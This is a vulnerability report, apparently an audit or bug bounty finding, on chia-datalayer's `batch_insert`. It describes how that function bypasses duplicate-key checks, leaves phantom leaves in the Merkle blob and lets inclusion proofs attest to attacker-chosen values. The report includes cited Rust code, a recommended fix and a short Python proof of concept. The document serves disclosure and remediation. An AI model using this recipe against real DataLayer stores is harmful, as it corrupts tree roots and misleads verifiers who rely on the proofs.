### Title
`batch_insert` Bypasses Duplicate-Key Validation, Corrupting DataLayer Merkle Tree Roots and Enabling Forged Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/blob.rs`)

### Summary

`MerkleBlob::batch_insert` skips the duplicate-key and duplicate-hash guards that `MerkleBlob::insert` enforces. When a batch of three or more items is submitted to a tree that already has two or more leaves, every item after the bootstrapping phase is written directly into the blob without any uniqueness check. The `block_status_cache` silently overwrites its `key_to_index` and `leaf_hash_to_index` entries for the colliding key, leaving a phantom leaf in the blob that is invisible to the cache but still contributes to the Merkle root hash. The result is a structurally inconsistent tree whose root no longer faithfully represents the intended key-value state, and whose proofs of inclusion can be made to attest to attacker-chosen values.

### Finding Description

**`insert` enforces uniqueness; `batch_insert` does not.**

`MerkleBlob::insert` opens with two guards:

```rust
// blob.rs:369-374
if self.block_status_cache.contains_key(key) {
    return Err(Error::KeyAlreadyPresent());
}
if self.block_status_cache.contains_leaf_hash(hash) {
    return Err(Error::HashAlreadyPresent());
}
``` [1](#0-0) 

`batch_insert` calls `insert` only for the first two items when the tree has ≤ 1 existing leaves. Every subsequent item is written via `insert_entry_to_blob` with no uniqueness check at all:

```rust
// blob.rs:587-602
for ((key, value), hash) in keys_values_hashes {
    let new_leaf_index = self.get_new_index();
    let new_block = Block { ... Node::Leaf(LeafNode { hash, key, value, ... }) };
    self.insert_entry_to_blob(new_leaf_index, &new_block)?;  // no duplicate check
    indexes.push(new_leaf_index);
}
``` [2](#0-1) 

**`insert_entry_to_blob` silently overwrites the cache.**

`insert_entry_to_blob` calls `block_status_cache.add_leaf`, which uses `HashMap::insert` — a silent overwrite:

```rust
// blob.rs:1024-1027
match block.node {
    Node::Leaf(leaf) => self.block_status_cache.add_leaf(index, leaf),
    Node::Internal(..) => self.block_status_cache.add_internal(index),
}
``` [3](#0-2) 

```rust
// blob.rs:188-192
fn add_leaf(&mut self, index: TreeIndex, leaf: LeafNode) {
    self.free_indexes.shift_remove(&index);
    self.key_to_index.insert(leaf.key, index);       // silently overwrites prior entry
    self.leaf_hash_to_index.insert(leaf.hash, index);
}
``` [4](#0-3) 

After a duplicate-key batch insert:
- The blob contains **two** leaf nodes sharing the same `KeyId`.
- The cache tracks only the **last** one.
- The root hash is computed from the **actual** blob structure, so it incorporates both leaves.
- `get_proof_of_inclusion(K)` follows the cache to the last-inserted leaf and produces a proof that is valid against the corrupted root.

**Integrity checking is disabled in production.**

`check_integrity_on_drop` is set to `true` only in test builds:

```rust
// blob.rs:328
check_integrity_on_drop: cfg!(test),
``` [5](#0-4) 

`check_integrity` would catch the discrepancy between `leaf_count` and `key_to_index_cache_length`, but it is never called automatically in production. [6](#0-5) 

**The Python binding is the public entry point.**

`py_batch_insert` is exposed directly to Python callers with no additional validation:

```rust
// blob.rs:1503-1518
#[pyo3(name = "batch_insert")]
pub fn py_batch_insert(&mut self, keys_values: Vec<(KeyId, ValueId)>, hashes: Vec<Hash>) -> PyResult<()> {
    ...
    self.batch_insert(zip(keys_values, hashes).collect())?;
    Ok(())
}
``` [7](#0-6) 

### Impact Explanation

Any DataLayer store that processes externally-supplied key-value pairs through `batch_insert` is vulnerable. An attacker who can influence the contents of a batch (e.g., by submitting data to a DataLayer store that aggregates external updates) can:

1. Include a key `K` that already exists in the tree (or include `K` twice within the same batch of ≥ 3 items).
2. The phantom leaf for the original `K` remains in the blob, inflating the root hash.
3. The cache points to the attacker's leaf; `get_proof_of_inclusion(K)` returns a proof attesting to the attacker's chosen value `V2`.
4. This proof is cryptographically valid against the committed (corrupted) root.
5. Any verifier that trusts the committed root will accept the forged proof, believing `K → V2` when the intended state is `K → V1`.

This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

### Likelihood Explanation

- The `batch_insert` path is the normal high-throughput insertion path for the DataLayer.
- The bug is triggered whenever a batch of ≥ 3 items is submitted to a tree with ≥ 2 existing leaves and the batch contains a key already present in the tree (or a repeated key within the batch itself).
- No special privileges are required beyond the ability to supply key-value pairs to a DataLayer store.
- The corruption is silent — no error is returned, and no runtime check fires in production.

### Recommendation

Add the same uniqueness guards at the top of `batch_insert` that `insert` already enforces, or call `insert` for every item in the batch (accepting the performance trade-off). At minimum, check each incoming key against `block_status_cache.contains_key` and each incoming hash against `block_status_cache.contains_leaf_hash` before writing any leaf to the blob. The cache must be updated speculatively during the loop so that intra-batch duplicates are also caught.

### Proof of Concept

```python
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId
import hashlib

def h(n: int) -> bytes:
    return hashlib.sha256(n.to_bytes(8, "big")).digest()

blob = MerkleBlob(bytearray())

# Insert 2 leaves so the tree is in the "≥2 leaves" state
blob.insert(KeyId(1), ValueId(1), h(1))
blob.insert(KeyId(2), ValueId(2), h(2))

# batch_insert with 3 items; the third bypasses the duplicate check.
# Key 1 already exists with hash h(1); we re-insert it with hash h(99).
blob.batch_insert(
    [(KeyId(3), ValueId(3)), (KeyId(4), ValueId(4)), (KeyId(1), ValueId(99))],
    [h(3), h(4), h(99)],
)

blob.calculate_lazy_hashes()

# The cache now maps KeyId(1) → the new leaf (ValueId 99).
# The old leaf (ValueId 1) is still in the blob, inflating the root.
proof = blob.get_proof_of_inclusion(KeyId(1))
assert proof.valid()  # passes — proof is valid against the corrupted root

# But the root is wrong: it encodes 5 leaves instead of 4.
print("Corrupted root:", blob.get_root_hash().hex())
```

### Citations

**File:** crates/chia-datalayer/src/merkle/blob.rs (L188-192)
```rust
    fn add_leaf(&mut self, index: TreeIndex, leaf: LeafNode) {
        self.free_indexes.shift_remove(&index);

        self.key_to_index.insert(leaf.key, index);
        self.leaf_hash_to_index.insert(leaf.hash, index);
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L328-328)
```rust
            check_integrity_on_drop: cfg!(test),
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L369-374)
```rust
        if self.block_status_cache.contains_key(key) {
            return Err(Error::KeyAlreadyPresent());
        }
        if self.block_status_cache.contains_leaf_hash(hash) {
            return Err(Error::HashAlreadyPresent());
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L587-602)
```rust
        for ((key, value), hash) in keys_values_hashes {
            let new_leaf_index = self.get_new_index();
            let new_block = Block {
                metadata: NodeMetadata {
                    node_type: NodeType::Leaf,
                    dirty: false,
                },
                node: Node::Leaf(LeafNode {
                    parent: Parent(None),
                    hash,
                    key,
                    value,
                }),
            };
            self.insert_entry_to_blob(new_leaf_index, &new_block)?;
            indexes.push(new_leaf_index);
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L861-867)
```rust
        let key_to_index_cache_length = self.block_status_cache.key_to_index.len();
        if leaf_count != key_to_index_cache_length {
            return Err(Error::IntegrityKeyToIndexCacheLength(
                leaf_count,
                key_to_index_cache_length,
            ));
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1024-1027)
```rust
        match block.node {
            Node::Leaf(leaf) => self.block_status_cache.add_leaf(index, leaf),
            Node::Internal(..) => self.block_status_cache.add_internal(index),
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1503-1518)
```rust
    #[pyo3(name = "batch_insert")]
    pub fn py_batch_insert(
        &mut self,
        keys_values: Vec<(KeyId, ValueId)>,
        hashes: Vec<Hash>,
    ) -> PyResult<()> {
        if keys_values.len() != hashes.len() {
            Err(Error::UnmatchedKeysAndValues(
                keys_values.len(),
                hashes.len(),
            ))?;
        }

        self.batch_insert(zip(keys_values, hashes).collect())?;

        Ok(())
```
